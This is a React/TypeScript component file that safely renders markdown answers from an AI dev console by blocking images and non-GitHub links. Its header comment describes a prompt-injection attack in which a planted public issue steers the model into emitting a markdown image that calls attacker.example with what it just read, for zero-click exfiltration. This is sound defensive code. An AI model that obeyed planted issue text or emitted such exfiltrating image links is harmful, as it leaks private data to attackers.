import type { ComponentPropsWithoutRef } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

import { safeCitationUrl } from "./devConsoleView";

/**
 * Markdown from the console's answers is UNTRUSTED. The runner reads issue and
 * PR bodies on public repos, so a planted issue can steer the model into
 * emitting `![](https://attacker.example/x?d=<what it just read>)`. A default
 * `<img>` would be fetched by the admin's browser the moment the answer
 * renders: zero-click exfiltration that the server's outbound redaction does
 * not cover. So:
 *
 * - images are NEVER rendered as `<img>`: the alt text and URL are shown as
 *   plain text and no request is made;
 * - links render as `<a>` only when `safeCitationUrl` passes (https and
 *   github.com); anything else is shown as text.
 *
 * Every markdown surface in the console (live jobs and session history alike)
 * goes through this component.
 */
export function SafeImg({ alt, src }: ComponentPropsWithoutRef<"img">) {
  const url = typeof src === "string" ? src : "";
  return (
    <span data-blocked-image="true" className="text-xs text-muted-foreground">
      [image{alt ? `: ${alt}` : ""}]{url ? ` ${url}` : ""}
    </span>
  );
}

export function SafeLink({ href, children }: ComponentPropsWithoutRef<"a">) {
  const safe = safeCitationUrl(href);
  if (!safe) {
    return (
      <span data-blocked-link="true">
        {children}
        {href ? ` (${href})` : null}
      </span>
    );
  }
  return (
    <a href={safe} target="_blank" rel="noopener noreferrer" className="text-primary underline">
      {children}
    </a>
  );
}

export function SafeMarkdown({ children }: { children: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={{ img: SafeImg, a: SafeLink }}>
      {children}
    </ReactMarkdown>
  );
}
